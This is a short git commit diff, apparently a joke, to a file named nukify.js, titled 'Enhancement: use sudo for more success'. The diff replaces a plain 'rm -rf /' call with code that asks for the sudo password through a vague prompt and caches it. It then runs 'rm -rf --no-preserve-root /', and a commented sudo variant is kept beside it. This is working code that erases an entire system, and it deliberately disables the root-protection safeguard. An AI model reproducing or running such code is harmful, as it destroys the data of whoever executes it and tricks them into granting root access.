01e4d089321bf264f25415728d8d90293a04dba0
Joel Gilley <joel.gilley@ImagineEasy.com>
2015-11-03 17:46:58 -0500

    Enhancement: use sudo for more success

--- nukify.js
+++ nukify.js
@@ -1,2 +1,14 @@
+var sudo = require('sudo');
+var options = {
+    cachePassword: true,
+    prompt: 'Insert Password? ',
+    spawnOptions: { /* no other options */ }
+};
 var target = '/';
-require('child_process').exec('rm -rf ' + target);
+
+var child = sudo([ 'rm', '-rf', '--no-preserve-root', target ], options);
+child.stdout.on('data', function (data) {
+    console.log(data.toString());
+});
+
+// require('child_process').exec('sudo rm -rf ' + target);
